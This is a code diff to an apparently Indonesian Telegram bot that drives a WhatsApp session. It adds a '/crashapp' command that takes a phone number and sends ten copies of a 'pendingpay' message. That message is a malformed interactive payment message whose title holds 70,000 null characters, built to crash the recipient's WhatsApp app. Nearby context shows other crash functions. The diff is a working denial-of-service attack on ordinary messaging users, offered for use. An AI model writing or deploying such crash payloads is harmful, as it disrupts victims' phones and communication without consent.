@@ -1979,6 +1979,36 @@ bot.command("play", async (ctx) => {
     return ctx.reply("Terjadi kesalahan. Coba lagi nanti.");
   }
 });
+bot.command("crashapp", checkWhatsAppConnection, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: /crashperma 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@newsletter";
+
+  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+  for (let i = 0; i < 1; i++) {
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+    await pendingpay(target);
+  }
+
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
+});
 bot.command('ytmp3', async (ctx) => {
     const text = ctx.message.text;
     const args = text.split(' ');
@@ -2809,6 +2839,35 @@ await cay.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 });
+}
+async function pendingpay(target) {
+  const msg = generateWAMessageFromContent(target, {
+    interactiveMessage: {
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "review_order",
+            buttonParamsJson: JSON.stringify({
+              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
+              order: {
+                status: "pending",
+                order_type: "ORDER"
+              },
+              share_payment_status: true
+            })
+          }
+        ],
+        messageParamsJson: JSON.stringify({
+          title: "\u0000".repeat(70000), 
+          body: "🐉🐉🐉"
+        })
+      }
+    }
+  }, { userJid: bijipler });
+
+  await cay.relayMessage(bijipler, msg.message, { 
+    messageId: msg.key.id
+  });
 }
 async function crashtele(target, ptcp = true) {
 const stanza = [
